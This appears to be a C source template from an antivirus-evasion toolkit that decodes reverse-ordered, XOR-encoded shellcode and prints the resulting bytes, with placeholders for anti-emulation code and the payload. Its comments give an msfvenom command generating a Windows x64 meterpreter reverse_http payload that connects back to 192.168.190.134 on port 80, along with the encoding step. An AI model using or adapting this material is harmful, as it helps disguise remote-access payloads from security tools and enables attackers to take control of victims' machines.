#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// compile: cl.exe /nologo /MT /Tcreverse_byte_order_xor.c /link /OUT:reverse_byte_order_xor.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

int main(void)
{
        // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
        // python3 reverse_byte_order_xor.py
	{{ANTI_EMULATION}}

	{{SHELLCODE}}

        char shellcode[598] = {0};
        unsigned int len = sizeof(reversed_payload);
        int xorkey = 23;

        // reverse and de-xor our array of ints
        for (int i = 0; i < len; i++)
        {
                char decoded = reversed_payload[len - i - 1] ^ xorkey;
                shellcode[i] = decoded;
        }

        int idx = 0;
        while (idx < sizeof(reversed_payload))
        {
                if (idx == (sizeof(reversed_payload) - 1))
                {
                        printf("0x%02x ", (unsigned char)shellcode[idx]);
                }
                else
                {
                        printf("0x%02x, ", (unsigned char)shellcode[idx]);
                }
                idx++;
        }

        return 0;
}
